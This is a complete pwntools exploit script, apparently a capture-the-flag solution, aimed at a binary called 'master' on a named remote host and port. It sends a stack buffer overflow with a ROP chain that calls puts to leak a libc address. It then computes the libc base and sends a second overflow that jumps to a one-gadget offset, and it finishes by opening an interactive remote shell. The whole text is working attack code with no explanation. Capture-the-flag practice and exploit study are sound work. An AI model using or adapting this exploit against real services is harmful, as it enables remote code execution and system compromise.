from pwn import *

p = remote('dets.kro.kr', 23337)
#p = process('./master')
e = ELF("./master")
l = ELF('/home/youngsouk/libc-database/db/libc6-i386_2.23-0ubuntu10_amd64.so')

context.log_level = "debug"

rop = ROP(e)

rop.puts(e.got['puts'])
rop.raw(0x080484BB)

p.sendline('a' * 0x34 + str(rop))
p.recvuntil('\x0a')
libc = u32(p.recv(4)) - l.sym['puts']

log.info('libc : ' + hex(libc))
p.recv()
p.sendline('a' * 0x34 +p32(libc + 0x3a80e))

p.interactive()
